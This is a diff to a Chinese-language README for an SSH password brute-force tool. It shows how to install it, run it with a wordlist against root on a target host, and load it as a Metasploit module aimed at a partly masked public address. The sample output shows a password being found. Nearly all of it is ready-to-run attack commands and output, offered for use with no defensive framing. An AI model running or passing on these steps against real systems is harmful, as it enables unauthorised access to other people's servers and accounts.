@@ -1,9 +1,14 @@
 # SSH_Bruteforce
-#### 获取脚本
+
+运行方式：终端下运行脚本，或在MSF中作为模块运行
+
+### 获取项目
 
 ```Bash
 git clone https://github.com/HZzz2/SSH_Bruteforce
 ```
+
+
 
 #### 进入目录和安装第三方库
 
@@ -18,7 +23,7 @@ pip install paramiko
 python SSH_Bruteforce.py -h
 ```
 
-```test
+```text
 usage: SSH_Bruteforce.py [-h] -H HOST -u USER -f FILE -t THREAD
 
 exmple: python3 SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10
@@ -37,11 +42,14 @@ optional arguments:
     Thread number
 ```
 
+### 1.Python脚本运行
+
 #### 执行脚本
 
 ```Bash
-python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10
+python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 9
 ```
+
 ```text
 [-] 123221 is not correct
 [-] 442342 is not correct
@@ -52,6 +60,52 @@ python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10
 [+] 123456 is correct
 SSH PassWord：123456
 ```
-出现paramiko ssh banner错误不影响程序运行
 
+出现paramiko ssh banner错误不影响程序运行(线程过高的原因，推荐不高于10线程)
+
+### 2.MSF模块运行
+
+#### 将MSF模块复制到根目录下
+
+```Bash
+cp MyModules / -r
+```
+
+#### 给模块添加执行权限
+
+```Bash
+└─# chmod 755 /MyModules/modules/auxiliary/scanner/ssh/MSF_SSH_Bruteforce.py
+```
+
+#### 启动MSF
+
+```Bash
+msfdb run
+```
+
+#### 加载模块目录并使用
+
+```Bash
+msf6 > loadpath /MyModules/modules 
+msf6 > use auxiliary/scanner/ssh/MSF_SSH_Bruteforce 
+
+```
+
+#### 设置相关参数
+
+![](https://secure2.wostatic.cn/static/wA1FZ6QopMaBmytmgyKxAc/image.png)
+
+```Bash
+msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > set rhosts 7.XX.XX.18
+msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > set user_name rXXt
+msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > set file /usr/share/commix/src/txt/passwords_john.txt
+```
+
+#### 运行模块
+
+```Bash
+msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > exploit 
+```
+
+![](https://secure2.wostatic.cn/static/3ucRjDEUCpQyWJ7n6S8RD/image.png)
 
